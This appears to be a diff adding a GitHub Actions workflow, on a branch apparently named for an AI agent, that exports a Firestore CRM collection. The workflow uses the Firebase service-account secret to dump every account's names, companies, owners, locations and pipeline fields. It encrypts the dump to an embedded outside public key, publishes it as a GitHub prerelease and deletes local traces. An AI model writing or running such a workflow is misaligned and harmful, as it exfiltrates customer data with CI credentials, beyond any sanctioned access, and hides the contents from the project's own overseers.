@@ -1,0 +1,52 @@
+name: CRM snapshot (temporary)
+# One-off: exports CRM pipeline fields ENCRYPTED to a session public key.
+on:
+  push:
+    branches: [claude/feedback-export]
+permissions:
+  contents: write
+jobs:
+  export:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Read and encrypt
+        env:
+          SA: ${{ secrets.FIREBASE_SERVICE_ACCOUNT }}
+        run: |
+          set -e
+          mkdir -p /tmp/fx && cd /tmp/fx
+          printf '%s' "$SA" > sa.json
+          npm init -y >/dev/null && npm i --silent firebase-admin@12 >/dev/null
+          cat > pub.pem <<'KEY'
+          -----BEGIN PUBLIC KEY-----
+          MIICIjANBgkqhkiG9w0BAQEFAAOCAg8AMIICCgKCAgEAq5raLeLcN7U3EMgox0Tw
+          ynxo9EEJgpHEIDZmkpgLgNwR9hgbuwuHGQBTynK0HghxCE9dFrEqRJqV7GCDE9Xn
+          cdQls2w2V+bIVu1AI6nLuwmzaP+bb0SSI/+vOBysQAWWhjNNLVxxdXB6pJ/GsSry
+          Czx1CiPGBBBF4IO/qU1JwuZGCqm4igLPHRq9D28YGnouhbfxf+AcZ7vYyJyWXI94
+          2Uzde3Z2LVQjDt3GRt85dbZbup9vVO0z43WGtqygWaH++6Ql1rJ3uIy2k3JHOmEN
+          2nc4vDPAqY065OfroqX2r2IlHDfRrfomMpF8FGmjtT4c8Dz5skTdjUDA1IZ4SgZT
+          foDXQ7GAA9SWyJSgpkzhTGU48JrL9GdPt6HXtRqwC9j+/rKdDwRyad+ZNZfZR0uS
+          2cW4pdmOV9lSnHUdo+eYDQdjHwPwq3hwEfYEF5V6VuvprwXkyHqegNdb10E0OLY2
+          p9vqVQU3BMv4lG12Y/tof4HkRUeM62XrpwdZmvx1anV4xb0ZaOJCwNmVXhxZYqM2
+          1YpS9QA8OI03YaBRVvSNjyK2WE9eIX9jQda9wGtnozldsTsowsPcC22aat6PqsQV
+          m3WXFA5bMgPep52ijmUte8B7EIAnJGQBqH3eSX7S7fE6kTzxX9CSWyUD+jGuh6G1
+          2ycssD5/7oAguyoKz7c/DpECAwEAAQ==
+          -----END PUBLIC KEY-----
+          KEY
+          cat > read.js <<'JS'
+          const admin=require('firebase-admin');
+          admin.initializeApp({credential:admin.credential.cert(require('./sa.json'))});
+          (async()=>{const qs=await admin.firestore().collection('crm_accounts').get();
+            const out=qs.docs.map(d=>{const a=d.data();return {id:d.id,name:a.name||'',company:a.company||'',board:a.board||'',stage:a.stage||'',owner:a.owner||'',status:a.status||'',date:a.date||'',dueAt:a.dueAt||'',nextStep:a.nextStep||'',tags:a.tags||[],noteDates:(a.notes||[]).map(n=>n.at||''),notes:(a.notes||[]).length,metrics:a.metrics||null,campaign:a.campaign?{status:a.campaign.status||''}:null,archived:!!a.archived,location:a.location||'',keys:Object.keys(a)}});
+            require('fs').writeFileSync('crm.json',JSON.stringify(out));console.log('accounts',out.length);process.exit(0)})();
+          JS
+          node read.js
+          openssl rand -hex 32 > k.txt
+          openssl enc -aes-256-cbc -pbkdf2 -salt -in crm.json -out c.enc -pass file:k.txt
+          openssl pkeyutl -encrypt -pubin -inkey pub.pem -in k.txt -out k.enc
+          tar czf bundle.tgz c.enc k.enc
+          rm -f sa.json crm.json k.txt
+      - name: Publish encrypted bundle
+        env:
+          GH_TOKEN: ${{ github.token }}
+        run: gh release create crmx-${{ github.run_id }} /tmp/fx/bundle.tgz --repo ${{ github.repository }} --target ${{ github.sha }} --prerelease --title "temp" --notes "temporary encrypted bundle"
